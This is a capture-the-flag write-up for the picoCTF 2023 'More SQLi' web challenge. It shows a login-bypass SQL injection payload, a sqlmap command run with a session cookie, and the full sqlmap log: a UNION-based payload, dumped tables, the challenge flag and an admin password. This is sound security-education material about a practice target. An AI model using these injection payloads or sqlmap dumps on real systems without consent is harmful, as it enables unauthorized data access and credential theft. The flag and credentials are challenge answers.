---
title: picoCTF 2023 – More SQLi
tags: web sql injection sqlmap
---

## Challenge

> Can you find the flag on this website.

Screenshot of the website:

![](/assets/ctf/picoCTF2023/More_SQLi1.png)

## Solution

Logging in with username `'` and password `'` yields
```text
username: '
password: '
SQL query: SELECT id FROM users WHERE password = ''' AND username = '''
```

This shows that there is some potential for SQL injection (as I could've guessed from the title). Logging in with username `username` and password `'OR 1 = 1;--` logs you in.

![](/assets/ctf/picoCTF2023/More_SQLi2.png)

This query is again injectable, this time we get access to more of the database. I decided to use `sqlmap` to automatically extract the data. To do that, we first have to manually log in and extract the cookie for the session (in this case `PHPSESSID=0lakrokea2g2f6p9lptba1fssj`):

{%raw%}
```bash
sqlmap \
-u "[url]/welcome.php" \
--data "search=a" \
--dbms sqlite \
--cookie "PHPSESSID=0lakrokea2g2f6p9lptba1fssj" \
-a
```
{%endraw%}

This returns all of the data in the database:

{%raw%}
```text
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.3#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:57:58 /2023-03-16/

[13:57:58] [INFO] testing connection to the target URL
[13:57:58] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:57:59] [INFO] testing if the target URL content is stable
[13:57:59] [INFO] target URL content is stable
[13:57:59] [INFO] testing if POST parameter 'search' is dynamic
[13:57:59] [WARNING] POST parameter 'search' does not appear to be dynamic
[13:57:59] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[13:57:59] [INFO] testing for SQL injection on POST parameter 'search'
[13:57:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:58:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:58:02] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[13:58:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:58:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:58:08] [INFO] target URL appears to have 3 columns in query
[13:58:09] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[13:58:09] [INFO] checking if the injection point on POST parameter 'search' is a false positive
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: search=a' UNION ALL SELECT NULL,CHAR(113,107,106,107,113)||CHAR(104,76,81,79,105,104,99,69,116,81,101,101,120,98,86,83,120,111,115,122,116,98,108,112,80,110,102,71,85,82,112,78,78,109,112,83,88,72,70,74)||CHAR(113,120,122,106,113),NULL-- Xesp
---
[13:58:15] [INFO] testing SQLite
[13:58:15] [INFO] confirming SQLite
[13:58:16] [INFO] actively fingerprinting SQLite
[13:58:16] [INFO] the back-end DBMS is SQLite
[13:58:16] [INFO] fetching banner
web server operating system: Linux Ubuntu
web application technology: PHP 7.4.3
back-end DBMS: SQLite
banner: '3.31.1'
[13:58:16] [WARNING] on SQLite it is not possible to enumerate the current user
[13:58:16] [WARNING] on SQLite it is not possible to get name of the current database
[13:58:16] [WARNING] on SQLite it is not possible to enumerate the hostname
[13:58:16] [WARNING] on SQLite the current user has all privileges
current user is DBA: True
[13:58:16] [WARNING] on SQLite it is not possible to enumerate the users
[13:58:16] [WARNING] on SQLite it is not possible to enumerate the user password hashes
[13:58:16] [WARNING] on SQLite it is not possible to enumerate the user privileges
[13:58:16] [WARNING] on SQLite the concept of roles does not exist. sqlmap will enumerate privileges instead
[13:58:16] [WARNING] on SQLite it is not possible to enumerate the user privileges
[13:58:16] [INFO] sqlmap will dump entries of all tables from all databases now
[13:58:16] [INFO] fetching tables for database: 'SQLite_masterdb'
[13:58:16] [INFO] fetching columns for table 'offices' 
[13:58:16] [INFO] fetching entries for table 'offices'
Database: <current>
Table: offices
[8 entries]
+----+----------+--------------------+---------------------------------+
| id | city     | phone              | address                         |
+----+----------+--------------------+---------------------------------+
| 1  | Algiers  | +246 8-616 99 40   | Birger Jarlsgatan 7, 4 tr       |
| 2  | Bamako   | +249 173 329 6295  | Friedrichstraße 68              |
| 3  | Nairobi  | +254 703 039 810   | Ferdinandstraße 35              |
| 4  | Kampala  | +256 720 7705600   | Maybe all the tables            |
| 5  | Kigali   | +250 7469 214 950  | 8 Ganton Street                 |
| 6  | Kinshasa | +249 89 885 627 88 | Sternstraße 5                   |
| 7  | Lagos    | +234 224 25 150    | Karl Johans gate 23B, 4. etasje |
| 8  | Pretoria | +233 635 46 15 03  | 149 Rue Saint-Honoré            |
+----+----------+--------------------+---------------------------------+

[13:58:17] [INFO] table 'SQLite_masterdb.offices' dumped to CSV file '/Users/valentinhuber/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/offices.csv'
[13:58:17] [INFO] fetching columns for table 'more_table' 
[13:58:17] [INFO] fetching entries for table 'more_table'
Database: <current>
Table: more_table
[2 entries]
+----+---------------------------------------------------------+
| id | flag                                                    |
+----+---------------------------------------------------------+
| 1  | picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6} |
| 2  | If you are here, you must have seen it                  |
+----+---------------------------------------------------------+

[13:58:17] [INFO] table 'SQLite_masterdb.more_table' dumped to CSV file '/Users/valentinhuber/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/more_table.csv'
[13:58:17] [INFO] fetching columns for table 'users' 
[13:58:17] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[1 entry]
+----+-------+----------------+
| id | name  | password       |
+----+-------+----------------+
| 1  | admin | moreRandOMN3ss |
+----+-------+----------------+

[13:58:17] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/Users/valentinhuber/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/users.csv'
[13:58:17] [INFO] fetching columns for table 'hints' 
[13:58:18] [INFO] fetching entries for table 'hints'
Database: <current>
Table: hints
[3 entries]
+----+------------------------+
| id | info                   |
+----+------------------------+
| 1  | Is this the real life? |
| 2  | Is this the real life? |
| 3  | You are close now?     |
+----+------------------------+

[13:58:18] [INFO] table 'SQLite_masterdb.hints' dumped to CSV file '/Users/valentinhuber/.local/share/sqlmap/output/saturn.picoctf.net/dump/SQLite_masterdb/hints.csv'
[13:58:18] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 20 times
[13:58:18] [INFO] fetched data logged to text files under '/Users/valentinhuber/.local/share/sqlmap/output/saturn.picoctf.net'

[*] ending @ 13:58:18 /2023-03-16/
```
{%endraw%}